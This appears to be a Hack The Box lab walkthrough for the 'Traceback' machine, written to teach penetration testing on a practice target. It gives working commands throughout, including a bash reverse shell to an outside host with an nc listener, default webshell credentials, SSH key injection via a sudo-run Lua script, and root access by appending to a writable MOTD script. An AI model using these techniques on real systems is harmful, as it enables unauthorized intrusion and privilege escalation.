# 🔍 HTB: Traceback — Walkthrough

## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
**Tags:** `webshell`, `lua`, `luvit`, `motd`, `ssh`, `cron privesc`

---

## 📡 Recon

### Full TCP Port Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.181
```

### Targeted Service Detection

```bash
nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.181
```

- **Ports Open**: 22 (SSH), 80 (HTTP)
- Apache/2.4.29, OpenSSH 7.6p1 → likely Ubuntu 18.04

---

## 🌐 [Web Enumeration](HTTP)

### Webpage Source

- Page shows “owned” message by Xh4H
- Comment: `<!--Some of the best web shells that you might need ;)-->`
- Google search → list of known PHP webshell names

### Create Wordlist of Common Webshells

```bash
vim php_shells.txt  # Add shell names like smevk.php, cmd.php, r57.php etc.
```

### Gobuster with Wordlist

```bash
gobuster dir -u http://10.10.10.181 -w php_shells.txt
```

✅ **Found**: `/smevk.php`

---

## 🐚 Shell as webadmin

### Webshell Access

- Login: `admin:admin` (from source)
- Use Reverse Shell payload:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

### Listener

```bash
nc -lvnp 443
```

🎯 Shell obtained as `webadmin`

---

## 🔐 Persist Access (Optional)

### Add SSH Key via Webshell

```bash
mkdir ~/.ssh
echo "your-ssh-pub-key" > ~/.ssh/authorized_keys
```

Then [SSH](SSH) in:

```bash
ssh webadmin@10.10.10.181 -i ~/keys/id_rsa
```

---

## 🧑‍💻 Privilege Escalation: webadmin → sysadmin

### Check for Sudo Rights

```bash
sudo -l
```

✅ `webadmin` can run `/home/sysadmin/luvit` as `sysadmin` without password

---

### Lua-based SSH Key Write Exploit

```lua
-- Save as /dev/shm/key.lua
authkeys = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
authkeys:write("ssh-ed25519 AAAA... your-key-here ... user@host\n")
authkeys:close()
```

Run it:

```bash
sudo -u sysadmin /home/sysadmin/luvit /dev/shm/key.lua
```

🎯 Now SSH as `sysadmin`:

```bash
ssh sysadmin@10.10.10.181 -i ~/keys/id_rsa_sysadmin
```

✅ Get `user.txt`

---

## 🧑‍🔧 Privilege Escalation: sysadmin → root

### MOTD Scripts Writable

```bash
ls -l /etc/update-motd.d/
```

✅ Writable by `sysadmin` group (e.g., 00-header)

---

### Add Root Key via MOTD

```bash
echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> /etc/update-motd.d/00-header
```

Immediately login again as any user to trigger script:

```bash
ssh webadmin@10.10.10.181
```

🎯 Now SSH as `root`:

```bash
ssh root@10.10.10.181 -i ~/keys/id_rsa_sysadmin
```

✅ Grab `root.txt`

---

## 🧩 Beyond Root

### Cron Discovery (via pspy or manually)

```bash
crontab -l
```

Shows:

```cron
* * * * * /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
* * * * * sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

- Scripts overwritten every 30 seconds from backup
- Acts as cleanup mechanism

### Enumeration Tips

- Group-writable scripts in MOTD folder = privesc vector
- LinPEAS / LinEnum with `-t` will detect this